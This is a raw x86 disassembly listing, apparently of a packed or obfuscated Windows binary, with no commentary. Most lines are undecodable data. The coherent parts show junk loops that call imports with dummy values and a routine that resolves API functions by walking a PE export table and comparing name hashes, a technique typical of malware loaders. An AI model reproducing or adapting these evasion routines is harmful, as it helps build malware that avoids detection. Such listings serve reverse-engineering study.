  419e9a:	pop    DWORD PTR [ecx+0x58033db3]
  419ea0:	sub    eax,0x9aca43bd
  419ea6:	cmp    BYTE PTR [edx+edi*4+0x18f94832],dh
  419ead:	and    BYTE PTR [eax-0x7e4059d],al
  419eb3:	in     al,0x42
  419eb5:	scas   al,BYTE PTR es:[edi]
  419eb6:	inc    edx
  419eb7:	stc    
  419eb8:	sbb    DWORD PTR [eax],0xbb8404b7
  419ebe:	loope  0x419ef4
  419ec0:	lea    esp,[edi+edx*4]
  419ec3:	rol    al,cl
  419ec5:	xor    DWORD PTR [esi-0x73],eax
  419ec8:	repnz mov edi,0x3158a8ce
  419ece:	adc    edi,DWORD PTR [esi+0x7]
  419ed1:	inc    eax
  419ed2:	cwde   
  419ed3:	pop    ss
  419ed4:	leave  
  419ed5:	and    eax,ebp
  419ed7:	add    ebp,ebx
  419ed9:	pushf  
  419eda:	scas   eax,DWORD PTR es:[edi]
  419edb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419edc:	outs   dx,DWORD PTR ds:[esi]
  419edd:	dec    eax
  419ede:	mov    ds:0x6261b9a6,eax
  419ee3:	sbb    DWORD PTR [esi+0x40],edx
  419ee6:	call   0x4b2a:0xca20db2f
  419eed:	mov    edi,0x53340a6e
  419ef2:	inc    esp
  419ef3:	cmp    cl,dh
  419ef5:	jno    0x419ec3
  419ef7:	xlat   BYTE PTR ds:[ebx]
  419ef8:	jl     0x419f27
  419efa:	(bad)  
  419efb:	in     al,dx
  419efc:	js     0x419f67
  419efe:	sub    ecx,DWORD PTR [ebx-0x315721ff]
  419f04:	or     BYTE PTR [esi-0x6ecdf3bc],dl
  419f0a:	xor    eax,0xc6c66172
  419f0f:	cld    
  419f10:	retf   
  419f11:	mov    ds:0xa5e68143,eax
  419f16:	stos   BYTE PTR es:[edi],al
  419f17:	sub    al,0x7d
  419f19:	sti    
  419f1a:	in     al,dx
  419f1b:	jbe    0x419f46
  419f1d:	pop    es
  419f1e:	xchg   edi,eax
  419f1f:	sub    esi,DWORD PTR [ebx]
  419f21:	clc    
  419f22:	mov    dl,0x8d
  419f24:	fild   DWORD PTR [ebx+ecx*2-0x16a72641]
  419f2b:	mov    ch,0x74
  419f2d:	imul   esi,DWORD PTR [edi+0x1f],0xffffff90
  419f31:	les    ebp,FWORD PTR [ebp+0x217e437a]
  419f37:	add    cl,BYTE PTR [ebp-0x2edf17eb]
  419f3d:	jo     0x419f30
  419f3f:	sahf   
  419f40:	xchg   edx,eax
  419f41:	into   
  419f42:	xchg   esi,eax
  419f43:	mul    BYTE PTR [edi-0x4d7c3d6]
  419f49:	xchg   edx,eax
  419f4a:	add    esi,eax
  419f4c:	addr16 addr16 (bad) 
  419f4f:	lea    ebp,[esi+edi*2+0x75e971de]
  419f56:	and    al,0xa0
  419f58:	sar    BYTE PTR [edi+0xd],0x5f
  419f5c:	dec    eax
  419f5d:	jmp    0x11be53ae
  419f62:	gs inc eax
  419f64:	fisttp QWORD PTR [ebx*1+0x34cb794f]
  419f6b:	cmp    DWORD PTR ds:0x3945ac55,0x63
  419f72:	mov    ebp,0xbec2c6d4
  419f77:	cmp    ecx,DWORD PTR [esi]
  419f79:	push   0xc66139b2
  419f7e:	fcmovb st,st(3)
  419f80:	xlat   BYTE PTR ds:[ebx]
  419f81:	adc    BYTE PTR [esi+eiz*8-0x6c],ah
  419f85:	mov    edi,0xfb28494c
  419f8a:	cmc    
  419f8b:	fbstp  TBYTE PTR [esp+eiz*4]
  419f8e:	fldenv [edx]
  419f90:	and    DWORD PTR [esi],ebp
  419f92:	sbb    al,0xec
  419f94:	mov    DWORD PTR [ebx+esi*4-0x5215777f],edi
  419f9b:	and    BYTE PTR [esi+0xfcae34d],ch
  419fa1:	test   DWORD PTR [ecx-0x7efffffa],edx
  419fa7:	add    eax,0x42a7c5
  419fac:	popa   
  419fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fae:	inc    edx
  419faf:	add    bh,bh
  419fb1:	jne    0x419fbb
  419fb3:	or     DWORD PTR ds:0x42a871,0x48c2
  419fbd:	call   0x4175e1
  419fc2:	and    DWORD PTR ds:0x42a835,edi
  419fc8:	mov    DWORD PTR [ebp-0x20],eax
  419fcb:	jmp    0x41a200
  419fd0:	aas    
  419fd1:	into   
  419fd2:	leave  
  419fd3:	int    0xd9
  419fd5:	(bad)  
  419fd7:	into   
  419fd8:	fwait
  419fd9:	or     BYTE PTR [eax-0x74],0xfb
  419fdd:	retf   
  419fde:	lds    esp,FWORD PTR [edi+0x787fd380]
  419fe4:	adc    BYTE PTR [esi+0x78],bh
  419fe7:	js     0x41a02f
  419fe9:	in     al,dx
  419fea:	mov    edx,0x59e9b3c3
  419fef:	retf   0x23b2
  419ff2:	js     0x419fc3
  419ff4:	stos   BYTE PTR es:[edi],al
  419ff5:	ins    BYTE PTR es:[edi],dx
  419ff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ff7:	xchg   esi,eax
  419ff8:	es daa 
  419ffa:	outs   dx,DWORD PTR ds:[esi]
  419ffb:	and    bh,dl
  419ffd:	aas    
  419ffe:	icebp  
  419fff:	enter  0xd7e3,0xf6
  41a003:	xor    eax,0xeffac0f6
  41a008:	xchg   edx,eax
  41a009:	pop    ebp
  41a00b:	mov    ebp,0x3848ad89
  41a010:	(bad)  
  41a011:	mov    ds,WORD PTR [ebx]
  41a013:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a014:	add    eax,ebp
  41a016:	sbb    eax,0x25aaeb3
  41a01b:	jmp    0x41a011
  41a01d:	push   edi
  41a01e:	mov    eax,ebx
  41a020:	aam    0xd1
  41a022:	stc    
  41a023:	jg     0x41a01d
  41a025:	popf   
  41a026:	(bad)  
  41a027:	inc    eax
  41a028:	fsubr  QWORD PTR [edi+0x2cd4bfc0]
  41a02e:	arpl   WORD PTR [ebx],sp
  41a030:	xchg   edi,eax
  41a031:	iret   
  41a032:	mov    ds:0x4516876b,eax
  41a037:	call   DWORD PTR [eax]
  41a039:	rcl    DWORD PTR [ecx+0x4457916a],1
  41a03f:	mov    edi,DWORD PTR [ebp-0x7c0f3c1c]
  41a045:	sbb    bh,BYTE PTR [ebx+0x78d677e5]
  41a04b:	out    dx,eax
  41a04c:	inc    ecx
  41a04d:	add    al,0x25
  41a04f:	xor    eax,0xb12f5520
  41a054:	cmc    
  41a055:	pop    eax
  41a056:	sbb    eax,0x3767267d
  41a05b:	sbb    al,0x83
  41a05d:	jle    0x41a07b
  41a05f:	mov    eax,0x73e1caa
  41a064:	pusha  
  41a065:	or     esp,DWORD PTR [ebx]
  41a067:	mov    eax,ds:0x2d9b7e14
  41a06c:	mov    al,ds:0x7189d834
  41a071:	daa    
  41a072:	and    DWORD PTR [edx+0x2f2567c3],eax
  41a078:	cmp    esp,eax
  41a07a:	push   ecx
  41a07b:	retf   
  41a07c:	and    eax,0x7e73e604
  41a081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a082:	jge    0x41a09a
  41a084:	std    
  41a085:	jp     0x41a07b
  41a087:	mov    edi,0x1a58c602
  41a08c:	js     0x41a04e
  41a08e:	sbb    eax,0x739f6fd3
  41a093:	retf   0x23e4
  41a096:	add    eax,0x2b1a23b9
  41a09b:	test   eax,0xe0289fa1
  41a0a0:	aaa    
  41a0a1:	je     0x41a028
  41a0a3:	lahf   
  41a0a4:	hlt    
  41a0a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0a6:	addr16 pop ebx
  41a0a8:	mov    ds:0xd1f95d0,al
  41a0ad:	jae    0x41a069
  41a0af:	rcr    edx,cl
  41a0b1:	in     al,0x59
  41a0b3:	pop    es
  41a0b4:	mov    eax,ds:0x43510dd5
  41a0b9:	cmp    al,BYTE PTR [ebx-0x28]
  41a0bc:	enter  0xce47,0xa3
  41a0c0:	inc    ebx
  41a0c1:	repz fcom DWORD PTR [ecx+0x4773c627]
  41a0c8:	mov    ebp,0x91011b99
  41a0cd:	int3   
  41a0ce:	int3   
  41a0cf:	push   ecx
  41a0d0:	mov    edi,0xefe11ab
  41a0d5:	sbb    DWORD PTR [ecx+0x66],0x44
  41a0d9:	mov    al,0x21
  41a0db:	jmp    0x7029d2d7
  41a0e0:	out    0x23,al
  41a0e2:	and    DWORD PTR [ebp-0x1f756df2],ebx
  41a0e8:	mov    esp,DWORD PTR [ecx+0x6270504c]
  41a0ee:	cmc    
  41a0ef:	adc    al,0x91
  41a0f1:	imul   edi,ebx,0x3c2fb4b5
  41a0f7:	and    eax,0x5a5a4a06
  41a0fc:	push   cs
  41a0fd:	je     0x41a0f5
  41a0ff:	outs   dx,DWORD PTR ds:[esi]
  41a100:	jbe    0x41a09d
  41a102:	fimul  WORD PTR [edi-0x2db6e80b]
  41a108:	nop
  41a109:	retf   
  41a10a:	add    BYTE PTR [esi+0x770e1e8d],ah
  41a110:	push   eax
  41a111:	xchg   ebp,eax
  41a112:	inc    ebx
  41a113:	mov    ebp,0x5193068f
  41a118:	into   
  41a119:	dec    ebx
  41a11a:	adc    ebp,ebp
  41a11c:	jle    0x41a11b
  41a11e:	ret    0x1e06
  41a121:	sar    DWORD PTR [esi+0x1d72ddd5],1
  41a127:	lods   eax,DWORD PTR ds:[esi]
  41a128:	cld    
  41a129:	mov    bh,0xf7
  41a12b:	lahf   
  41a12c:	cs inc eax
  41a12e:	outs   dx,BYTE PTR ds:[esi]
  41a12f:	aam    0x84
  41a131:	push   0xffffffb8
  41a133:	popa   
  41a134:	or     eax,DWORD PTR [eax+eax*2+0x5d]
  41a138:	shl    DWORD PTR [ebp+0x38c697c],0x74
  41a13f:	mov    DWORD PTR [edi-0x33a8e4e4],esp
  41a145:	mov    ebx,0xbe39aabb
  41a14a:	mov    ebp,0x9fbd4831
  41a14f:	dec    ebx
  41a150:	stos   BYTE PTR es:[edi],al
  41a151:	(bad)  
  41a152:	adc    ebp,ebp
  41a154:	shr    BYTE PTR [esp+ebx*1-0x115e4c6c],1
  41a15b:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41a15d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a15e:	fwait
  41a15f:	pop    esp
  41a160:	inc    ecx
  41a161:	adc    bh,0x62
  41a164:	sahf   
  41a165:	inc    ebp
  41a166:	inc    edi
  41a167:	push   0x168c0c29
  41a16c:	sbb    eax,0x6dc97efa
  41a171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a172:	pushf  
  41a173:	loop   0x41a19b
  41a175:	mov    bh,0xf6
  41a177:	mov    ah,0x4d
  41a179:	mul    DWORD PTR [ebx-0x4e]
  41a17c:	jnp    0x41a156
  41a17e:	pop    ds
  41a17f:	inc    esp
  41a180:	imul   ebx,DWORD PTR [ebx-0x65f13b6c],0x82672b55
  41a18a:	into   
  41a18b:	jmp    0x5b32:0x12f4a9f
  41a192:	iret   
  41a193:	(bad)  
  41a194:	loop   0x41a182
  41a196:	rol    BYTE PTR [ebp+0x4e],cl
  41a199:	mov    ebp,ebx
  41a19b:	pushf  
  41a19c:	add    al,0xbb
  41a19e:	pushf  
  41a19f:	daa    
  41a1a0:	inc    esi
  41a1a1:	sti    
  41a1a2:	pop    esi
  41a1a3:	sub    esp,DWORD PTR [ebx-0x2c]
  41a1a6:	jmp    0x9ba63c2d
  41a1ab:	(bad)  
  41a1ac:	dec    ebx
  41a1ad:	sbb    ebx,DWORD PTR [eax]
  41a1af:	(bad)  
  41a1b0:	sti    
  41a1b1:	xlat   BYTE PTR ds:[ebx]
  41a1b2:	mov    cs,ebp
  41a1b4:	retf   
  41a1b5:	jne    0x41a1e4
  41a1b7:	dec    edx
  41a1b8:	dec    ebp
  41a1b9:	cmp    al,0xf9
  41a1bb:	loop   0x41a19c
  41a1bd:	dec    ebx
  41a1be:	cmp    DWORD PTR ds:[esi+0x5b],0x3f
  41a1c3:	jne    0x41a22a
  41a1c5:	inc    esp
  41a1c6:	xor    DWORD PTR [ecx],ecx
  41a1c8:	bound  esi,QWORD PTR [edx-0x46a859a2]
  41a1ce:	ins    BYTE PTR es:[edi],dx
  41a1cf:	leave  
  41a1d0:	pop    edx
  41a1d1:	push   ecx
  41a1d2:	cmp    eax,0xb7918e75
  41a1d7:	stos   DWORD PTR es:[edi],eax
  41a1d8:	and    edi,DWORD PTR [edx+0x4]
  41a1db:	ret    0x1a55
  41a1de:	sbb    al,0x40
  41a1e0:	scas   eax,DWORD PTR es:[edi]
  41a1e1:	jmp    0x30cd:0x294335bf
  41a1e8:	dec    edx
  41a1e9:	pop    esp
  41a1ea:	and    BYTE PTR [eax],0xb4
  41a1ed:	jl     0x41a219
  41a1ef:	inc    edx
  41a1f0:	xor    eax,0x2ae3de13
  41a1f5:	in     eax,dx
  41a1f6:	mov    eax,ds:0x753896cc
  41a1fb:	mov    bh,0x3c
  41a1fd:	data16 scas al,BYTE PTR es:[edi]
  41a1ff:	(bad)  [ebx+0x4d8bfc45]
  41a205:	loopne 0x41a1ce
  41a207:	add    eax,0x42a7b1
  41a20c:	sbb    al,0x0
  41a20e:	add    BYTE PTR [eax],al
  41a210:	cmp    DWORD PTR ds:0x42a7b1,0x0
  41a217:	je     0x41a247
  41a21d:	cmp    DWORD PTR ds:0x42a7b1,0x29
  41a224:	jne    0x41a233
  41a22a:	push   DWORD PTR [ebp-0xc]
  41a22d:	call   DWORD PTR ds:0x41d124
  41a233:	xor    esi,esi
  41a235:	xor    esi,DWORD PTR ds:0x42a7b1
  41a23b:	dec    esi
  41a23c:	mov    DWORD PTR ds:0x42a7b1,esi
  41a242:	jmp    0x41a210
  41a247:	mov    esi,0x7510850
  41a24c:	mov    DWORD PTR ds:0x42a84d,0x3f72
  41a256:	xor    eax,esi
  41a258:	add    eax,ebx
  41a25a:	cmp    ecx,eax
  41a25c:	mov    DWORD PTR ds:0x42a76d,0x752f
  41a266:	je     0x41a678
  41a26c:	push   DWORD PTR [ebp-0x20]
  41a26f:	sub    DWORD PTR ds:0x42a759,0x42a84d
  41a279:	push   DWORD PTR [ebp+0x8]
  41a27c:	call   0x408a76
  41a281:	jmp    0x41a4b6
  41a286:	(bad)  
  41a287:	les    edi,FWORD PTR [edi]
  41a289:	iret   
  41a28a:	rcr    ebx,1
  41a28c:	(bad)  
  41a28d:	leave  
  41a28e:	push   edi
  41a28f:	push   edx
  41a290:	in     al,dx
  41a291:	je     0x41a2a6
  41a293:	retf   
  41a294:	push   esp
  41a295:	aaa    
  41a296:	cwde   
  41a297:	sar    DWORD PTR [edi+0x78],1
  41a29a:	adc    BYTE PTR [esi+0x78],bh
  41a29d:	js     0x41a2c1
  41a29f:	xlat   BYTE PTR ds:[ebx]
  41a2a0:	or     bh,BYTE PTR [ebp-0x6]
  41a2a3:	sar    DWORD PTR [edi-0x63],1
  41a2a6:	fild   WORD PTR [eax+edx*8]
  41a2a9:	cmc    
  41a2aa:	inc    esp
  41a2ab:	lods   eax,DWORD PTR ds:[esi]
  41a2ac:	push   ebx
  41a2ad:	xor    DWORD PTR [ebx+0x6],esp
  41a2b0:	ror    DWORD PTR [eax-0x246121e5],cl
  41a2b6:	or     al,0xaf
  41a2b8:	mov    ds:0xbfb7f04c,eax
  41a2bd:	xchg   edx,eax
  41a2be:	cli    
  41a2bf:	sub    BYTE PTR [eax+0x23],0x16
  41a2c3:	mov    eax,ds:0xd0586284
  41a2c8:	std    
  41a2c9:	fidiv  DWORD PTR gs:[ebp+0x5c]
  41a2cd:	iret   
  41a2ce:	fmul   DWORD PTR [ebx+edx*8+0x65b2dcd8]
  41a2d5:	xchg   BYTE PTR [edx],dh
  41a2d7:	cmp    eax,esi
  41a2d9:	sub    eax,0xbe560279
  41a2de:	into   
  41a2df:	lods   al,BYTE PTR ds:[esi]
  41a2e0:	inc    ecx
  41a2e1:	xor    BYTE PTR ss:[eax-0x2c9b11cf],0xa0
  41a2e9:	mov    esp,0x1d6384d3
  41a2ee:	neg    DWORD PTR [ebx]
  41a2f0:	xor    BYTE PTR [edx-0x73ef38b9],al
  41a2f6:	ja     0x41a2c5
  41a2f8:	sbb    DWORD PTR [ebp+0x76],ecx
  41a2fb:	pusha  
  41a2fc:	xchg   BYTE PTR [edx+eiz*8],dl
  41a2ff:	out    dx,eax
  41a300:	sbb    dl,bh
  41a302:	fwait
  41a303:	mov    ebx,0xdbe6946e
  41a308:	stc    
  41a309:	enter  0xbcef,0x93
  41a30d:	jmp    0x32e3:0xe53e2796
  41a314:	mov    ch,0x54
  41a316:	in     al,0x3a
  41a318:	out    dx,eax
  41a319:	sbb    al,bh
  41a31b:	mov    eax,0xca231a3f
  41a320:	xchg   esi,eax
  41a321:	bswap  eax
  41a323:	cmp    al,0xe6
  41a325:	push   es
  41a326:	mov    al,ds:0xc7e181f3
  41a32b:	enter  0xd506,0x10
  41a32f:	jmp    0x41a386
  41a331:	jns    0x41a33f
  41a333:	push   ds
  41a334:	pop    edi
  41a335:	ins    DWORD PTR es:[edi],dx
  41a336:	test   eax,0x8668cf43
  41a33b:	test   al,0xeb
  41a33d:	sbb    edi,ebx
  41a33f:	cld    
  41a340:	push   esi
  41a341:	enter  0xb047,0xb8
  41a345:	inc    ebp
  41a346:	mov    BYTE PTR [ebp+0x39],ch
  41a349:	pop    es
  41a34a:	cld    
  41a34b:	(bad)  
  41a34c:	dec    esi
  41a34d:	jl     0x41a37d
  41a34f:	fld    TBYTE PTR [ebp-0x6bfd0bb7]
  41a355:	js     0x41a319
  41a357:	sub    al,0x47
  41a359:	mov    al,ds:0xa89e5596
  41a35e:	inc    ebp
  41a35f:	push   0x5403690b
  41a364:	(bad)  
  41a365:	into   
  41a366:	mov    ecx,DWORD PTR [edi-0x335ce26f]
  41a36c:	aad    0xbb
  41a36e:	repnz sbb BYTE PTR [ebx],dl
  41a371:	sub    al,dl
  41a373:	sbb    edx,ebp
  41a375:	sub    bl,bh
  41a377:	cwde   
  41a378:	xor    al,0xd6
  41a37a:	jbe    0x41a369
  41a37c:	pop    esi
  41a37d:	push   cs
  41a37e:	fisub  WORD PTR [eax+0x56815cf0]
  41a384:	(bad)  
  41a385:	sub    DWORD PTR [eax+0x6540477d],ebx
  41a38b:	iret   
  41a38c:	clc    
  41a38d:	ret    0xb54a
  41a390:	fwait
  41a391:	jle    0x41a333
  41a393:	xchg   ebx,eax
  41a394:	pop    esp
  41a395:	push   0xe22e2c19
  41a39a:	inc    esp
  41a39b:	aam    0xf
  41a39d:	aad    0x22
  41a39f:	vmovhpd xmm4,xmm6,QWORD PTR [edi-0x5b]
  41a3a4:	inc    ebx
  41a3a5:	ins    BYTE PTR es:[edi],dx
  41a3a6:	or     eax,0xba5e3ed6
  41a3ab:	ds stc 
  41a3ad:	sahf   
  41a3ae:	jl     0x41a40a
  41a3b0:	pusha  
  41a3b1:	test   DWORD PTR [ecx+eiz*4],0xdeba6bb1
  41a3b8:	or     DWORD PTR [eax+0x7226c943],0xffffffe2
  41a3bf:	dec    esp
  41a3c0:	cmp    BYTE PTR [esi-0x1],bl
  41a3c3:	repz pop DWORD PTR [eax+edi*2]
  41a3c7:	popf   
  41a3c8:	pop    esi
  41a3c9:	dec    eax
  41a3ca:	and    BYTE PTR [edx+edi*1-0x79],dl
  41a3ce:	test   bl,ah
  41a3d0:	inc    edx
  41a3d1:	popa   
  41a3d2:	jecxz  0x41a41e
  41a3d4:	xchg   cx,ax
  41a3d6:	sahf   
  41a3d7:	push   edi
  41a3d8:	or     bl,cl
  41a3da:	adc    DWORD PTR [edi+0x4b24035],0x44
  41a3e1:	retf   0x263e
  41a3e4:	or     al,0xd0
  41a3e6:	fistp  QWORD PTR [ebx+0x13]
  41a3e9:	xor    ebp,esp
  41a3eb:	mov    edi,?
  41a3ed:	retf   
  41a3ee:	fsub   st,st(0)
  41a3f0:	mov    eax,0xcb1b91f7
  41a3f5:	movd   DWORD PTR [ecx],mm1
  41a3f8:	dec    ebp
  41a3f9:	cwde   
  41a3fa:	leave  
  41a3fb:	sbb    dh,0x2
  41a3fe:	ss popf 
  41a400:	stos   BYTE PTR es:[edi],al
  41a401:	pop    ss
  41a402:	mov    ch,0xb0
  41a404:	cwde   
  41a405:	outs   dx,BYTE PTR ds:[esi]
  41a406:	jge    0x41a3c7
  41a408:	in     eax,dx
  41a409:	push   eax
  41a40a:	sbb    bl,BYTE PTR [ebp+esi*2+0x4b]
  41a40e:	lods   eax,DWORD PTR ds:[esi]
  41a40f:	jmp    0x41a40e
  41a411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a412:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a413:	cmp    edx,eax
  41a415:	dec    ecx
  41a416:	fcomp  DWORD PTR [esi+ebx*8]
  41a419:	stc    
  41a41a:	jg     0x41a415
  41a41c:	push   edi
  41a41d:	rol    ecx,cl
  41a41f:	add    eax,0x5513ad12
  41a424:	mov    ebx,0xf7562448
  41a429:	mov    eax,?
  41a42b:	push   0x27
  41a42d:	jmp    0xca79:0x53f937bd
  41a434:	lods   eax,DWORD PTR ds:[esi]
  41a435:	aam    0x42
  41a437:	cwde   
  41a438:	mov    ds:0x2adf987e,eax
  41a43d:	fwait
  41a43e:	retf   0xc6d8
  41a441:	add    eax,0x757f6ef2
  41a446:	cmc    
  41a447:	int    0x1c
  41a449:	push   esi
  41a44a:	sub    eax,0xd2e7c249
  41a44f:	iret   
  41a450:	icebp  
  41a451:	mov    ss,ebp
  41a453:	xor    DWORD PTR [ebx-0xd524344],esp
  41a459:	mov    bl,0xc7
  41a45b:	mov    cs,WORD PTR [ecx+edi*4]
  41a45e:	mov    WORD PTR [eax-0x650fd37a],gs
  41a464:	inc    ebp
  41a465:	(bad)  
  41a466:	(bad)  
  41a467:	pop    ss
  41a468:	dec    ebx
  41a469:	cdq    
  41a46a:	sub    eax,DWORD PTR [ecx+0x6b]
  41a46d:	movlps xmm3,QWORD PTR [ebp-0x18d095be]
  41a474:	retf   
  41a475:	(bad)  
  41a476:	push   esp
  41a477:	and    eax,0x4f6a8bd6
  41a47c:	xlat   BYTE PTR ds:[ebx]
  41a47d:	push   eax
  41a47e:	mov    ebx,0x5a0dd46c
  41a483:	adc    ebx,DWORD PTR [esi]
  41a485:	inc    ebx
  41a486:	inc    ecx
  41a487:	popf   
  41a488:	out    dx,al
  41a489:	inc    ebp
  41a48a:	push   0x7e
  41a48c:	jb     0x41a4ef
  41a48e:	sbb    eax,0xdd743d6c
  41a493:	or     esp,eax
  41a495:	mov    dh,0x54
  41a497:	gs (bad) 
  41a499:	in     al,0x57
  41a49b:	or     al,0x74
  41a49d:	add    eax,0x81f83106
  41a4a2:	jb     0x41a4ce
  41a4a4:	fst    DWORD PTR [esi]
  41a4a6:	xor    BYTE PTR [ebp-0x57],bh
  41a4a9:	or     eax,0xf3762a1c
  41a4ae:	push   0x37147e20
  41a4b3:	call   0x45cb3e71
  41a4b8:	in     al,dx
  41a4b9:	mov    DWORD PTR ds:0x42a75d,0x18
  41a4c3:	cmp    DWORD PTR ds:0x42a75d,0x0
  41a4ca:	je     0x41a5f6
  41a4d0:	cmp    DWORD PTR ds:0x42a75d,0x1a
  41a4d7:	jne    0x41a4e8
  41a4dd:	push   0x3f0b
  41a4e2:	call   DWORD PTR ds:0x41d200
  41a4e8:	mov    eax,ds:0x42a75d
  41a4ed:	dec    eax
  41a4ee:	mov    ds:0x42a75d,eax
  41a4f3:	jmp    0x41a4c3
  41a4f8:	and    DWORD PTR ds:0x42a7f1,0x0
  41a502:	jmp    0x41a512
  41a507:	mov    eax,ds:0x42a7f1
  41a50c:	inc    eax
  41a50d:	mov    ds:0x42a7f1,eax
  41a512:	cmp    DWORD PTR ds:0x42a7f1,0x1f
  41a519:	jae    0x41a5f6
  41a51f:	cmp    DWORD PTR ds:0x42a7f1,0x8
  41a526:	jne    0x41a53f
  41a52c:	push   0x8add
  41a531:	push   0x6acd
  41a536:	push   DWORD PTR [ebp-0x20]
  41a539:	call   DWORD PTR ds:0x41d128
  41a53f:	cmp    DWORD PTR ds:0x42a7f1,0x7
  41a546:	jne    0x41a557
  41a54c:	mov    eax,ds:0x42a7f1
  41a551:	inc    eax
  41a552:	mov    ds:0x42a7f1,eax
  41a557:	jmp    0x41a507
  41a55c:	mov    DWORD PTR ds:0x42a77d,0x11
  41a566:	cmp    DWORD PTR ds:0x42a77d,0x0
  41a56d:	je     0x41a5f6
  41a573:	cmp    DWORD PTR ds:0x42a77d,0x1d
  41a57a:	jne    0x41a58b
  41a580:	push   0x75df
  41a585:	call   DWORD PTR ds:0x41d12c
  41a58b:	mov    eax,ds:0x42a77d
  41a590:	dec    eax
  41a591:	mov    ds:0x42a77d,eax
  41a596:	jmp    0x41a566
  41a59b:	and    DWORD PTR ds:0x42a759,0x0
  41a5a5:	mov    ecx,DWORD PTR ds:0x42a759
  41a5ab:	inc    ecx
  41a5ac:	mov    DWORD PTR ds:0x42a759,ecx
  41a5b2:	cmp    DWORD PTR ds:0x42a759,0xb
  41a5b9:	jne    0x41a5cd
  41a5bf:	push   DWORD PTR [ebp-0x28]
  41a5c2:	push   0x2f79
  41a5c7:	call   DWORD PTR ds:0x41d204
  41a5cd:	cmp    DWORD PTR ds:0x42a759,0xa
  41a5d4:	jne    0x41a5e9
  41a5da:	xor    ecx,ecx
  41a5dc:	add    ecx,DWORD PTR ds:0x42a759
  41a5e2:	inc    ecx
  41a5e3:	mov    DWORD PTR ds:0x42a759,ecx
  41a5e9:	cmp    DWORD PTR ds:0x42a759,0x15
  41a5f0:	jb     0x41a5a5
  41a5f6:	mov    eax,DWORD PTR [ebp-0x4]
  41a5f9:	mov    ecx,DWORD PTR [ebp-0x14]
  41a5fc:	xor    eax,esi
  41a5fe:	add    eax,ebx
  41a600:	cmp    ecx,eax
  41a602:	je     0x41a678
  41a608:	mov    eax,DWORD PTR [ebp-0x14]
  41a60b:	mov    eax,DWORD PTR [eax+0x18]
  41a60e:	mov    DWORD PTR [ebp-0x20],eax
  41a611:	mov    eax,DWORD PTR [ebp-0x14]
  41a614:	mov    ecx,DWORD PTR [ebp+0x8]
  41a617:	add    ecx,DWORD PTR [eax+0x20]
  41a61a:	mov    DWORD PTR [ebp-0x28],ecx
  41a61d:	mov    eax,DWORD PTR [ebp-0x14]
  41a620:	mov    ecx,DWORD PTR [ebp+0x8]
  41a623:	add    ecx,DWORD PTR [eax+0x24]
  41a626:	mov    DWORD PTR [ebp-0x2c],ecx
  41a629:	mov    eax,DWORD PTR [ebp-0x14]
  41a62c:	mov    ecx,DWORD PTR [ebp+0x8]
  41a62f:	add    ecx,DWORD PTR [eax+0x1c]
  41a632:	xor    esi,esi
  41a634:	mov    DWORD PTR [ebp-0x14],ecx
  41a637:	mov    eax,DWORD PTR [ebp-0x28]
  41a63a:	mov    ecx,DWORD PTR [ebp+0x8]
  41a63d:	add    ecx,DWORD PTR [eax+edi*4]
  41a640:	lea    eax,[ebp-0x8]
  41a643:	mov    DWORD PTR [ebp-0x30],ecx
  41a646:	push   eax
  41a647:	push   DWORD PTR [ebp-0x30]
  41a64a:	push   DWORD PTR [ebp+0xc]
  41a64d:	call   0x4068d8
  41a652:	mov    eax,DWORD PTR [ebp-0x4]
  41a655:	mov    ecx,DWORD PTR [ebp-0x8]
  41a658:	xor    eax,0x7510850
  41a65d:	add    eax,ebx
  41a65f:	cmp    ecx,eax
  41a661:	jne    0x41a8b9
  41a667:	mov    eax,DWORD PTR [ebp-0x20]
  41a66a:	inc    edi
  41a66b:	cmp    edi,eax
  41a66d:	jb     0x419d40
  41a673:	jmp    0x41a8c9
  41a678:	mov    eax,DWORD PTR [ebp-0x4]
  41a67b:	xor    eax,esi
  41a67d:	jmp    0x41a8b2
  41a682:	retf   0xccc3
  41a685:	cmp    al,0xd9
  41a687:	rcr    edx,cl
  41a689:	leave  
  41a68a:	mov    esp,gs
  41a68c:	and    al,0x1
  41a68e:	test   al,0x5e
  41a690:	aam    0xb3
  41a692:	mov    al,0xd7
  41a694:	jg     0x41a70e
  41a696:	adc    BYTE PTR [esi+0x78],bh
  41a699:	js     0x41a6ea
  41a69b:	inc    esp
  41a69c:	mov    DWORD PTR [esi+0x6c],0x2085da37
  41a6a3:	ds dec ebp
  41a6a5:	cmp    eax,0x993aa455
  41a6aa:	adc    eax,0x1bcb474f
  41a6af:	cdq    
  41a6b0:	jl     0x41a67c
  41a6b2:	fs pop ecx
  41a6b4:	(bad)  
  41a6b5:	sub    edx,DWORD PTR [edx+0x25]
  41a6b8:	sub    al,0x74
  41a6ba:	stc    
  41a6bb:	arpl   WORD PTR [ecx+ecx*1],bx
  41a6be:	jbe    0x41a708
  41a6c0:	out    dx,al
  41a6c1:	fisubr DWORD PTR [edi]
  41a6c3:	lods   al,BYTE PTR ds:[esi]
  41a6c4:	aas    
  41a6c5:	xchg   esi,eax
  41a6c6:	mov    bh,0xb1
  41a6c8:	imul   esi,edi,0x1b
  41a6cb:	fwait
  41a6cc:	sub    DWORD PTR [edi+0x64],esi
  41a6cf:	call   0xf1ac:0x94c3c51b
  41a6d6:	mov    BYTE PTR [ecx],dh
  41a6d8:	les    edi,FWORD PTR [eax+0x32821ce5]
  41a6de:	adc    bh,BYTE PTR [ebx+0x24]
  41a6e1:	sbb    al,0x2e
  41a6e3:	push   esi
  41a6e4:	or     al,0xcf
  41a6e6:	push   0x55de4efd
  41a6eb:	cmp    cl,BYTE PTR [edx]
  41a6ed:	test   BYTE PTR [esp+esi*8+0x50],ah
  41a6f1:	loope  0x41a76c
  41a6f3:	dec    eax
  41a6f4:	or     eax,0x2a5b9c3e
  41a6f9:	repz sub ebp,DWORD PTR [edi-0x5d]
  41a6fd:	inc    esi
  41a6fe:	pop    eax
